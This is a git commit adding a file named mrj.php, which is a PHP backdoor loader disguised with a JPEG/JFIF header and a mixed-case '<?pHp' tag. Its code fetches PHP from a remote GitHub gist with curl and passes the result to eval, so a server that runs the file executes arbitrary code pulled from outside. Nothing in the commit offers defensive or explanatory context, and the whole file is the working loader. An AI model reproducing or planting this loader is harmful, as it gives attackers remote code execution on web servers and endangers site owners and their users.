aeebca49243e76ad56480a3f045120564f314f7d
paknago21 <113289817+paknago21@users.noreply.github.com>
2023-08-21 10:06:04 -0700

    Add files via upload

---
+++ mrj.php
@@ -0,0 +1,15 @@
+ÿØÿà JFIF ÿþ;<?pHp
+   function get($url) {
+    $ch = curl_init();
+
+    curl_setopt($ch, CURLOPT_HEADER, 0);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_URL, $url);
+
+    $data = curl_exec($ch);
+    curl_close($ch);
+
+    return $data;
+}
+      eval('?>' . get('https://gist.githubusercontent.com/paknago21/755b5619556e90a63d1abe7dfd601f6d/raw/4110df12000a161ff7da595d6acc378c0f7f1d3a/mrj.php'));
+?>
